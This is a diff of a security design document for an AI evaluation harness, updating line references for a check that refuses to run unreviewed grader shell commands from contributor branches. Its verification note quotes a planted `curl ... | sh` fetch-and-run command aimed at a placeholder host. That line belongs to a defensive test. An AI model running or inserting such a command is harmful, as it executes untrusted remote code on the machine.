@@ -153,8 +153,8 @@ exists: a check that reads what a grader command actually does has somewhere to 
 
 ### 4. Stop running graders from an unreviewed ref
 
-`evals/run_eval.py:998` executes a string from `assertions.json` with `shell=True`. The comment at
-`:996` justifies it by saying the command comes from a checked-in file in this repository, which is
+`evals/run_eval.py:1048` executes a string from `assertions.json` with `shell=True`. The comment at
+`:1046` justifies it by saying the command comes from a checked-in file in this repository, which is
 true of `main` and false of a pull request branch.
 
 Three options, in descending order of what they actually buy:
@@ -179,29 +179,29 @@ runs under `bypassPermissions`.
 is not a hypothetical: the whole reason to run an eval on a contributor branch is to see whether
 the contribution works.
 
-**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:930` runs before
-anything is graded, called from `cmd_tasks` (`:1874`), `cmd_agent_tasks` (`:1927`),
-`cmd_instructions_tasks` (`:1975`) and `cmd_regrade` (`:2195`), which are the only four subcommands
+**Landed, as the refusal.** `require_reviewed_graders` at `evals/run_eval.py:980` runs before
+anything is graded, called from `cmd_tasks` (`:1927`), `cmd_agent_tasks` (`:1981`),
+`cmd_instructions_tasks` (`:2029`) and `cmd_regrade` (`:2249`), which are the only four subcommands
 that execute an assertion command.
 Four decisions in it are worth stating, because each one is a place the control could have been
 weaker:
 
-- **The baseline is `origin/main`, falling back to `main`** (`:828`). Preferring the remote means
+- **The baseline is `origin/main`, falling back to `main`** (`:878`). Preferring the remote means
   a stale local branch cannot make an unreviewed change look reviewed.
 - **The guarded set is the suite's `assertions.json`, `tasks.json`, `fixtures/` and `patches/`,
-  and `run_eval.py` itself** (`:836`). The harness decides whether, where and as what a grader
+  and `run_eval.py` itself** (`:886`). The harness decides whether, where and as what a grader
   string runs, and an assertion such as `make test` runs a file the fixture supplies, so editing
   any of them is editing what a contributor can make the machine do.
-- **The comparison is against the working tree, not `HEAD`** (`:897`). A contributor's change
+- **The comparison is against the working tree, not `HEAD`** (`:947`). A contributor's change
   arrives committed on a branch or applied as a patch, and both produce the same shell command.
-- **The refusal prints the `workspace_command` strings that are new or changed** (`:861`, `:875`),
+- **The refusal prints the `workspace_command` strings that are new or changed** (`:911`, `:925`),
   and of the assertions only those: the regex kinds are matched in-process and execute nothing. It
   also lists every path that differs, since a fixture or patch change has no command to print. The
   point of the flag is that a human has read what runs, so it is put in front of them.
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:2909`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:2963`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
@@ -234,9 +234,9 @@ mode has every Bash and Edit call denied, and a denied call is recorded identica
 chose not to act. Removing the mode would not have bounded the run, it would have destroyed the
 measurement. The permission mode cannot be the control for a task run. The tool list can, so that
 is what shipped: `TASK_TOOLS` at `run_eval.py:123` allows Bash, the file tools and `Skill`, and
-`RunPermissions` at `:428` carries the tool list and the mode together so that widening the surface
-and suppressing prompts are two decisions rather than one `if/else` (`:488`-`:493`). `--all-tools`
-(`:1906`, `:2931`) restores the audited command line. The allowlist is derived from what the
+`RunPermissions` at `:478` carries the tool list and the mode together so that widening the surface
+and suppressing prompts are two decisions rather than one `if/else` (`:538`-`:543`). `--all-tools`
+(`:1960`, `:2985`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
@@ -606,7 +606,7 @@ is where the work resumes, and it needs the tag from step 6, which exists as `v0
    than a permission-mode change, for the reason in that control's note. Attack path 1.2 is
    narrowed, not closed.
 4. **Control 4**, stop running graders from an unreviewed ref. **Landed** as the refusal check at
-   `evals/run_eval.py:930`. The sandbox half is deliberately not done: the refusal decides who
+   `evals/run_eval.py:980`. The sandbox half is deliberately not done: the refusal decides who
    chose a grader command, and only the sandbox bounds what one can reach. Attack path 1.1 is
    gated, not closed.
 5. **Control 3**, run `check_evals.py` in CI. **Landed** as the `evals` job at
